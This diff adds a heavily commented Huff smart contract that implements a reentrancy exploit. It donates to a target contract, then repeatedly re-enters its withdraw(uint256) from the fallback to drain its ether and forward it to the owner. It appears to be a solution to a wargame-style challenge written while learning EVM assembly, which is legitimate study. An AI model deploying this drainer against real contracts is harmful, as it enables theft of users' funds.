@@ -1,0 +1,241 @@
+// Storage 
+#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
+#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()
+
+// Constructor
+#define macro CONSTRUCTOR() = takes (0) returns (0) {
+    // Payable: msg.value must be >= 0.001 Ether
+    0x038d7ea4c68000// [0x038d7ea4c68000] - 0.001 ether
+    callvalue       // [msg.value, 0x038d7ea4c68000] - msg.value
+    lt              // [0/1] - consumes top two items off stack and pushes 1 if item 1 is less than item 2, 0 otherwise
+    iszero          // [0/1] - consumes top item off stack and returns 1 if it is 0, 0 otherwise
+    payable         // [payable_label, 0/1]
+    jumpi           // [] - jumpi consumes top two items off stack and if 2nd item is not 0, PC counter is altered and execution continues from byte offset
+                    // otherwise, PC is incremented by 1 and execution continues on expected path
+    0x00            // [0x00] - size of return data
+    0x00            // [0x00] - offset of return data in memory
+    revert          // [] - revert consumes top 2 items off stack and stops current execution. We will hit these instructions if callvalue < 0.001 ether
+
+    payable:        // [] - jumpdest to continue execution if callvalue >= 0.001 ether
+
+    // Copy caller into OWNER_SLOT in storage
+    caller          // [msg.sender] - msg.sender
+    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
+    sstore          // [] - sstore consumes top 2 stack items. The first item is
+                    // the key (storage location) and the second item is the value (item to store)
+
+    // Copy constructor argument (address) into memory
+    0x20            // [0x20] - This will be the size for the the code we will copy to memory
+    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
+    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
+    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
+    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
+    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)
+
+    // Copy address from memory into INSTANCE_SLOT in storage
+    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
+    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
+    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
+    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
+}
+
+// Modifier
+#define macro ONLY_OWNER() = takes (0) returns (0) {
+    caller          // [msg.sender]
+    [OWNER_SLOT]    // [0x00] - storage slot where owner is stored
+    sload           // [owner] - loaded owner address onto stack from storage slot 0x00
+    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
+    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
+    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0
+
+    0x00            // [0x00] - size
+    0x00            // [0x00, 0x00] - byte offset
+    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)
+
+    is_owner:       // is_owner label. execution continues here is the caller is the owner
+}
+
+// View Function
+#define macro GET_BALANCE() = takes (0) returns (0) {
+    // Return the balance of the instance
+    [INSTANCE_SLOT] // [0x01] - the storage slot where the instance address is stored
+    sload           // [instance] - copied 32 bytes from storage slot 0x01 onto the stack
+    balance         // [instance_bal] - consumes top item off stack(address) and pushed balance of account ins wei. Will push 0 if no balance
+    0x00            // [0x00, instance_bal] - byte offset
+    mstore          // [] - copied instance_bal into memory, starting at byte offset 0x00
+    msize           // [size] - pushes size of active memory onto stack
+    0x00            // [0x00, size] - byte offset
+    return          // [] - consumes top two items off the stack and returns [size] bytes of data starting at offset 0x00 in memory
+}
+
+// 'Internal' Function
+#define macro INSTANCE_WITHDRAW() = takes (2) returns (0) {
+    // Copy `withdraw(uint256)` func sig into memory to use as calldata for CALL
+    0x2e1a7d4d      // [0x2e1a7d4d, return_data, instance] - func sig for `withdraw(uint256)`
+    0x00            // [0x00, 0x2e1a7d4d, return_data, instance] - byte offset
+    mstore          // [return_data, instance] - copied func sig into memory starting at byte offset 0x00 (overwritting previous func sig)
+    0x20            // [0x20, return_data, instance] - byte offset
+    mstore          // [instance] - copied return_data into memory, starting at byte offset 0x20
+
+    // MEMORY:
+    // [OFFSET 0]  000000000000000000000000000000000000000000000000000000002e1a7d4d -> `withdraw(uint256)` func sig
+    // [OFFSET 32] 00000000000000000000000000000000000000000000000000038d7ea4c68000 -> return data/msg.value (uint256)
+
+    // CALL into instance
+    0x00            // [0x00, instance] - size of return data (no return data)
+    dup1            // [0x00, 0x00, instance] - offset in memory where return data will be copied
+    0x24            // [0x24, 0x00, 0x00, instance] - size of calldata (func sig + uint256)
+    0x1c            // [0x1c, 0x24, 0x00, 0x00, instance] - byte offset in memory where calldata begins
+    0x00            // [0x00, 0x1c, 0x24, 0x00, 0x00, instance] - msg.value
+    dup6            // [instance, return_data, 0x1c, 0x24, 0x00, 0x00, instance] - duplicated instance
+    gas             // [gas, instance, return_data, 0x1c, 0x24, 0x00, 0x00, instance] - gas to send with call (gasleft())
+    call            // [success, instance] - consumes 7 items off stack and pushes 1 if call did not revert, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error_label, 0/1, instance]
+    jumpi           // [instance]
+}
+
+// Attack function
+#define macro ATTACK() = takes(0) returns (0) {
+    // Copy `donate(address)` func sig and caller in memory to use as calldata for CALL
+    0x00362a95      // [0x00362a95] - func sig for `donate(address)`
+    0x00            // [0x00, 0x00362a95] - byte offset
+    mstore          // [] - copied func sig to memory, starting at offset 0x00
+    address         // [self] - contract address
+    0x20            // [0x20, self] - byte offset
+    mstore          // [] - copied owner to memory, starting at offset 0x20
+
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000000362a95 -> `donate(address)` func sig
+    // [OFFSET 32] 000000000000000000000000fd7ac01f633e6873fb360bf04daeef97caeb7815 -> self
+
+    // CAll into Instance 
+    [INSTANCE_SLOT] // [0x01] - storage slot where instance address is stored
+    sload           // [instance] - copied instance onto stack from storage slot 0x01
+    0x00            // [0x00, instance] - size of return data (none)
+    0x00            // [0x00, 0x00, instance] - offset for where to store return data in memory
+    0x24            // [0x24, 0x00, 0x00, instance] - size of calldata (func sig + address)
+    0x1c            // [0x1c, 0x24, 0x00, 0x00, instance] - offset for location of calldata in memory
+    selfbalance     // [self_balance, 0x1c, 0x24, 0x00, 0x00, instance] - balance of contract
+    dup6            // [instance, self_balance, 0x1c, 0x24, 0x00, 0x00, instance] - duplicate instance to top of stack
+    gas             // [gas, instance, self_balance, 0x1c, 0x24, 0x00, 0x00, instance] - gas we are sending with call (gasleft())
+    call            // [success, instance] - consumes 7 items off stack and pushes 1 if call did not revert, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error_label, 0/1, instance]
+    jumpi           // [instance]
+
+    // Copy `balanceOf(address)` func sig to memory to use as calldata for STATICCALL
+    0x70a08231      // [0x70a08231, instance] - func sig for `balanceOf(address)`
+    0x00            // [0x00, 0x70a08231, instance] - byte offset
+    mstore          // [instance] - copied func sig to memory, starting at offset 0x00 (overwritting previous func sig)
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
+    // [OFFSET 32] 000000000000000000000000fd7ac01f633e6873fb360bf04daeef97caeb7815 -> self
+
+
+    // STATICCALL into instance
+    0x20            // [0x20, instance] - size of return data (address)
+    0x20            // [0x20, 0x20, instance] - offset for where to store return data in memory (will overwrite self)
+    0x24            // [0x24, 0x20, 0x20, instance] - size of calldata (func sig + address)
+    0x1c            // [0x1c, 0x24, 0x20, 0x20, instance] - offset for location of calldata in memory
+    dup5            // [instance, 0x1c, 0x24, 0x20, 0x20, instance] - duplicated instance to top of stack
+    gas             // [gas, instance, 0x1c, 0x24, 0x20, 0x20, instance] - gas we are sending with staticcall (gasleft())
+    staticcall      // [success, instance] - consumes 6 items off stack and pushes 1 if call was successful, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error_label, 0/1, instance]
+    jumpi           // [instance]
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
+    // [OFFSET 32] 00000000000000000000000000000000000000000000000000038d7ea4c68000 -> return data (uint256)
+
+    // Check return data to verify that it is greater than 0
+    0x20            // [0x20, instance] - bytes offset
+    mload           // [return_data, instance] - copied return data onto stack
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error_label, 0/1, instance]
+    jumpi           // [instance] - checking if return value is greater than 0
+    
+    // Copy return data onto stack to prep stack for INSTANCE_WITHDRAW. The internal function won't be able to read from memory when it is called in Fallback
+    // This is redundant, will refactor when I more about Huff.
+    0x20            // [0x20, instance] - byte offset
+    mload           // [return_data, instance] - copied return data onto stack from memory,starting at byte offset 0x20
+
+    INSTANCE_WITHDRAW()
+
+    stop
+}
+
+// Withdraw function
+#define macro WITHDRAW() = takes (0) returns (0) {
+    // send selfbalance to owner via CALL 
+    0x00           // [0x00] - size of return data
+    0x00           // [0x00, 0x00] - offset in memory where return data will be stored
+    0x00           // [0x00, 0x00, 0x00] - size of calldata
+    0x00           // [0x00, 0x00, 0x00, 0x00] - offset in memory where calldata resides
+    selfbalance    // [selfbalance, 0x00, 0x00, 0x00, 0x00] - balance of contract
+    caller         // [msg.sender, selfbalance, 0x00, 0x00, 0x00, 0x00] - msg.sender, we know it is the owner due to modifier
+    gas            // [gas, msg.sender, selfbalance, 0x00, 0x00, 0x00, 0x00] - gas to send with call (gasleft())
+    call           // [success] - consumes 7 items off stack and pushes 1 if call did not revert, 0 otherwise
+    iszero         // [0/1]
+    throw_error    // [throw_error_label, 0/1]
+    jumpi          // [] - making sure our call did not fail
+
+    stop
+}
+
+// Function Dispatching
+#define macro MAIN() = takes (0) returns (0) {
+    // Identify which function is being called
+    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
+    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
+    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
+    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
+                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)
+
+    dup1         // [func_sig, func_sig] - duplicate func sig
+    0xc1cfb99a   // [0xc1cfb99a, func_sig, func_sig] - func sig for `get_balance()`
+    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    get_balance  // [get_balance_label, 0/1, func_sig] - get_balance_label is a label (byte offset) for the get_balance instructions
+    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+
+    dup1         // [func_sig, func_sig]
+    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
+    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    attack       // [attack_label, 0/1, func_sig] - attack_label is a label (byte offset) for the attack instructions
+    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+
+    0x3ccfd60b   // [0x3ccfd60b, func_sig] - func sig for `withdraw()`
+    eq           // [0/1] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    withdraw     // [withdraw_label, 0/1] - withdraw_label is a label (byte offset) for the withdraw instructions
+    jumpi        // [] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+
+    // Fallback
+    caller       // [instance] - we will assume the instance is triggering the the fallback
+    callvalue    // [msg.value, instance] 
+    dup2         // [instance, msg.value, instance] - duplicated instance to top of stack
+    balance      // [instance_bal, msg.value, instance] - consumes top item and pushes balance of item (address)
+    reenter      // [reenter_label, instance_bal, msg.value, instance]
+    jumpi        // [msg.value, instance] - we will jump to INSTANCE_WITHDRAW instructions if the instance balance is is not 0. If it is we stop execution
+
+    stop
+
+    throw_error: // label for revert path
+        0x00 0x00 revert
+
+    get_balance: // label for get_balance instructions
+        GET_BALANCE()
+
+    attack:      // label for attack instructions
+        ONLY_OWNER()
+        ATTACK()
+
+    withdraw:   // label for withdraw instructions
+        ONLY_OWNER()
+        WITHDRAW()
+
+    reenter:    // label for instance withdraw instructions
+        INSTANCE_WITHDRAW()
+}
